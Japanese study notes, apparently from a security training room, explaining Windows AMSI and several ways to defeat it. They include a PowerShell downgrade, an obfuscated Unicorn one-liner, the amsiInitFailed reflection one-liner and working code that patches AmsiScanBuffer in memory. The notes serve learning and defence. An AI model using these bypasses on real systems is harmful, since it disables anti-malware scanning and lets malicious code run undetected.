## Runtime Detections
- コードやアプリケーションを実行する場合、インタプリタに関係なく、ほとんどの場合ランタイムを流れる。
- これは、WindowsのAPIコールを使ったり、.NETとやりとりするときによく見られる。[CLR (**C**ommon **L**anguage **R**untime)](https://docs.microsoft.com/en-us/dotnet/standard/clr)と[DLR (**D**ynamic **L**anguage **R**untime)](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview)は.NETのランタイムであり、Windowsシステムで作業するときに最もよく遭遇する。
  
- ランタイムの検知手段は、ランタイムで実行される前にコードをスキャンし、それが悪意があるかどうかを判断する。
- 検出手段とその背後にある技術によって、この検出は文字列シグネチャ、ヒューリスティック、または動作に基づいて行われる。
- コードが悪意のあるものであると疑われる場合、そのコードに値が割り当てられ、指定された範囲内であれば、実行が停止され、場合によってはファイル/コードが隔離または削除される。  
  
- ランタイム検知手段は、メモリとランタイムから直接スキャンするため、標準的なAVとは異なる。
- 同時に、AV製品は、コードから発生するコールやフックについてより深く知るために、これらのランタイム検出を採用することもできる。場合によっては、AV製品は、ヒューリスティックスの一部としてランタイム検出ストリーム／フィードを使用することがある。  
  
- AMSIは、Windowsにネイティブに搭載されているランタイム検出手段であり、他の製品やソリューションのためのインターフェース

## AMSI Overview

- AMSI (Anti-Malware Scan Interface)はPowerShellのセキュリティ機能で、あらゆるアプリケーションやサービスをマルウェア対策製品に直接統合することができる。
- DefenderはAMSIを利用して、.NETランタイム内で実行する前にペイロードやスクリプトをスキャンする。
- Windows Antimalware Scan Interface (AMSI)は、アプリケーションやサービスがマシン上に存在するあらゆるマルウェア対策製品と統合することを可能にする汎用性の高いインターフェース規格。
- AMSIは、エンドユーザーとそのデータ、アプリケーション、ワークロードに対するマルウェア保護を強化する
  
- AMSIは監視とスキャンの結果、レスポンス・コードから動作を決定する。以下は、考えられるレスポンス・コードのリストである
	- AMSI_RESULT_CLEAN = 0
	- AMSI_RESULT_NOT_DETECTED = 1
	- AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
	- AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
	- AMSI_RESULT_DETECTED = 32768
- これらのレスポンスコードは AMSI のバックエンドまたはサードパーティの実装を通じてのみ報告される。AMSI が悪意のある結果を検出した場合、実行を停止し、以下のエラーメッセージを送信する。
![](../../../画像ファイル/Pasted%20image%2020230622224159.png)
- AMSIは以下のWindowsコンポーネントに完全に統合されている
	- User Account Control, or UAC
	- PowerShell
	- Windows Script Host (wscript and cscript)
	- JavaScript and VBScript
	- Office VBA macros
- 攻撃者としては、上記のコンポーネントを標的にする場合、コードを実行したりコンポーネントを悪用したりする際には、AMSIとその実装に注意する必要がある。

##  AMSI Instrumentation

- AMSIのInstrumentationは複雑であり、複数のDLLと実行戦略が含まれる。
- それはInstrumentationの場所や実行されるレイヤーによって異なるプロバイダDLLやAPI呼び出しが使用される。

- AMSIはSystem.Management.Automation.dllからInstrumentationされる。これはWindowsで開発された.NETアセンブリ。
- アセンブリは、.NETベースのアプリケーションのデプロイメント、バージョン管理、再利用、アクティベーションスコープ、セキュリティ権限の基本的な単位を形成する。
- .NETアセンブリは、インタプリタやディスク上かメモリ上かによって、他のDLLやAPI呼び出しを装備する。
- 以下の図は、データが各レイヤーを通過する際にどのように解析され、どのDLLやAPI呼び出しが装備されているかを示している。
![](../../../画像ファイル/Pasted%20image%2020230622224623.png)
- 上のグラフでは、データは使用するインタープリター（PowerShell/VBScriptなど）に依存して流れ始める。データが各レイヤーでモデルを流れるにつれて、様々なAPIコールとインターフェースがインストルメンテーションされる。AMSIの完全なモデルを理解することは重要だが、下図に示すコア・コンポーネントに分解することもできる。
![](../../../画像ファイル/Pasted%20image%2020230622224648.png)
- 注意: AMSI は、CLR から実行される場合、メモリからロードされたときのみ装備される。ディスク上のMsMpEng.exe（Windows Defender）は、すでに装備されていると想定されます。  
  
- 既知のバイパスのほとんどは、[AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) APIコールを操作するWin32 APIレイヤーに配置されている。  
- AMSIの "Other Applications "インターフェイスには、AV プロバイダなどのサードパーティは、自社の製品から AMSI を装備できる。マイクロソフトは [AMSI functions](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions)と [AMSI stream interface](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream)を文書化している

- AMSI PowerShell Instrumentationのコードを分解することで、それがどのように実装され、不審なコンテンツがチェックされているかをより理解することができる。
- AMSI が装備されている箇所を見つけるには、Cobbr が管理している [InsecurePowerShell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) を使用。

```cpp
var scriptExtent = scriptBlockAst.Extent;
 if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
 {
  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
  throw new ParseException(new[] { parseError });
 }

 if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)

  HasSuspiciousContent = true;
```

## PowerShell Downgrade

- PowerShellのダウングレード攻撃は、攻撃者が現在のPowerShellのバージョンを変更し、セキュリティ機能を削除することを可能にする手軽な攻撃  
  
- ほとんどのPowerShellセッションは最新のPowerShellエンジンで始まるが、攻撃者はワンライナーで手動でバージョンを変更することができる。
- PowerShellのバージョンを2.0に「ダウングレード」することで、バージョン5.0までセキュリティ機能は実装されていなかったので、セキュリティ機能をバイパスできる
  
- この攻撃は、シンプル。バージョン(2)を指定する例
```powershell
PowerShell -Version 2
```
- この攻撃は、[Unicorn](https://github.com/trustedsec/unicorn)などのツールで積極的に悪用されている。
```powershell
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```

- この攻撃は危険性が低く、テクニックも単純なので、ブルーチームがこの攻撃を検知し、軽減する方法はいくらでもある。

## PowerShell Reflection

- Reflection を使用すると、ユーザまたは管理者は .NET アセンブリにアクセスし、対話することができる。
- アセンブリは、.NET ベースのアプリケーションの展開、バージョン管理、再利用、アクティブ化スコープ、およびセキュリティ許可の基本単位を形成する。
- .NETアセンブリは異質なものに思えるかもしれないが、exe（実行ファイル）やdll（ダイナミックリンクライブラリ）といった馴染みのある形式で形を成していることを知ることで、より親しみやすくなる
  
- PowerShellのリフレクションを悪用して、貴重なDLLの情報を変更したり特定したりすることができる。  
- PowerShell用の`AMSIUtils`は、`System.Management.Automation.AmsiUtils`にあるAMSIUtils .NETアセンブリに格納されている。  
  
- Reflection を使用して AMSI ユーティリティを変更し、バイパスするという目標を達成するための 1 行。
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
- コードの機能を説明するために、より小さなセクションに分割する。  
  
- 最初に、このスニペットはリフレクション関数`GetType`.を呼び出し、\[Ref.Assembly]からアセンブリを使用することを指定
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```
- 前のセクションで収集された情報は、`GetField`を使用してアセンブリ内の指定されたフィールドを取得する次の関数に転送される。
```powershell
.GetField('amsiInitFailed','NonPublic,Static')
```
- アセンブリとフィールドの情報は、`SetValue` を使用して `$false` から `$true` に値を設定するために、次のパラメータに転送される。
```powershell
.SetValue($null,$true)
```
- `amsiInitFailed`フィールドが`$true`に設定されると、AMSIは応答コードで応答する：AMSI_RESULT_NOT_DETECTED = 1

##  Patching AMSI

- AMSIは主に`amsi.dll`から装備され、ロードされる。これは先に見た図から確認できる。このDLLは悪用することができ、私たちが望むレスポンス・コードを指すように強制することができる。`AmsiScanBuffer`関数は、レスポンス・コードのポインタ／バッファにアクセスするために必要なフックと機能を提供してくれる。

- `AmsiScanBuffer`が脆弱なのは、起動時に`amsi.dll`がPowerShellプロセスにロードされるためで、私たちのセッションはユーティリティと同じパーミッションレベルを持っている

- `AmsiScanBuffer`は疑わしいコードの "バッファ "をスキャンし、`amsi.dll`に報告して応答を決定する。
- この関数を制御して、きれいなリターン・コードでバッファを上書きすることができる。リターン・コードに必要なバッファを特定するには、リバース・エンジニアリングを行う必要がある。
- BC-Securityによって修正され、Tal Libermanによってインスパイアされたコード・スニペットを分解する。RastaMouseもC#で書かれた同じテクニックを使った同様のバイパスを持っている。

- 大まかにAMSIパッチは、4つのステップに分けることができる
	1. `amsi.dll`のハンドル取得  
	2. `AmsiScanBuffer`のプロセスアドレスの取得  
	3. `AmsiScanBuffer`のメモリ保護を変更する  
	4. `AmsiScanBuffer`へのオペコードの書き込み
- [p/invoke](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke)を使ってkernel32から[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)、[GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)、[VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)をロードする。
```csharp
[DllImport(`"kernel32`")] // Import DLL where API call is stored
public static extern IntPtr GetProcAddress( // API Call to import
	IntPtr hModule, // Handle to DLL module
	string procName // function or variable to obtain
);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(
	string lpModuleName // Module to obtain handle
);

[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(
	IntPtr lpAddress, // Address of region to modify
	UIntPtr dwSize, // Size of region
	uint flNewProtect, // Memory protection options
	out uint lpflOldProtect // Pointer to store previous protection options
); 
```
- これで関数は定義されたが、`Add-Type`を使用してAPIコールをロードする必要がある。このコマンドレットは、関数が呼び出されるようにする適切な型と名前空間で関数をロードする。
```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```
- API関数を呼び出すことができるようになったので、`amsi.dll`がどこにあるのか、どのようにして関数を呼び出すのかを特定することができる。まず、`GetModuleHandle `を使用して AMSI のプロセス・ハンドルを特定する必要がある。
- 次に、このハンドルを使用して、`GetProcAddress`を使用して`AmsiScanBuffer`のプロセス・アドレスを特定する
```csharp
$handle = [Win32.Kernel32]::GetModuleHandle(
	'amsi.dll' // Obtains handle to amsi.dll
);
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
	$handle, // Handle of amsi.dll
	'AmsiScanBuffer' // API call to obtain
); 
```
- 次に、`AmsiScanBuffer`プロセス領域のメモリ保護を変更する必要がある。`VirtualProtect`のパラメータとバッファ・アドレスを指定します。  
  
- パラメータとその値に関する情報は、前述のAPIドキュメントを参照
```csharp
[UInt32]$Size = 0x5; // Size of region
[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options
[Win32.Kernel32]::VirtualProtect(
	$BufferAddress, // Point to AmsiScanBuffer
	$Size, // Size of region
	$ProtectFlag, // Enables R or RW access to region
	[Ref]$OldProtectFlag // Pointer to store old options
); 
```
- このバッファを特定するプロセスは、[here](https://rastamouse.me/memory-patching-amsi-bypass/)。バッファを指定したら、[marshal copy](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0)を使ってそのプロセスに書き込むことができる。
```csharp
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy(
	$buf, // Opcodes/array to write
	0, // Where to start copying in source array 
	$BufferAddress, // Where to write (AsmiScanBuffer)
	6 // Number of elements/opcodes to write
); 
```
- ほとんどのツールでは、このスクリプトを検出するためにシグネチャや検出を作成することができ、また作成されていることに注意すべき

## Automating for Fun and Profit

- この部屋で示した以前の方法を使うことが望ましいが、攻撃者は他の自動化ツールを使ってAMSIシグネチャを破ったり、バイパスをコンパイルしたりすることができる。  

### AMSI.fail
- 最初の自動化ツールは[amsi.fail](http://amsi.fail/)
  
- amsi.failは、既知のバイパスのコレクションからPowerShellバイパスをコンパイルして生成する。AMSI.failは、現在のプロセスのAMSIを破壊または無効にする難読化されたPowerShellスニペットを生成する。スニペットは、難読化する前に、テクニック/バリエーションの小さなプールからランダムに選択される。
- すべてのスニペットは、生成された出力が同じシグネチャを共有しないように、実行時/リクエスト時に難読化される

### AMSITrigger
- [AMSITrigger](https://github.com/RythmStick/AMSITrigger)を使えば、攻撃者はシグネチャにフラグを立てている文字列を自動的に識別し、それを変更して破ることができる。
- AMSIをバイパスするこの方法は、ファイル自体をクリーンにするため、他の方法よりも一貫性がある。  
  
- amsitriggerを使う構文は比較的簡単で、ファイルまたはURLと、ファイルをスキャンするフォーマットを指定する必要がある。以下は、amsitriggerの実行例
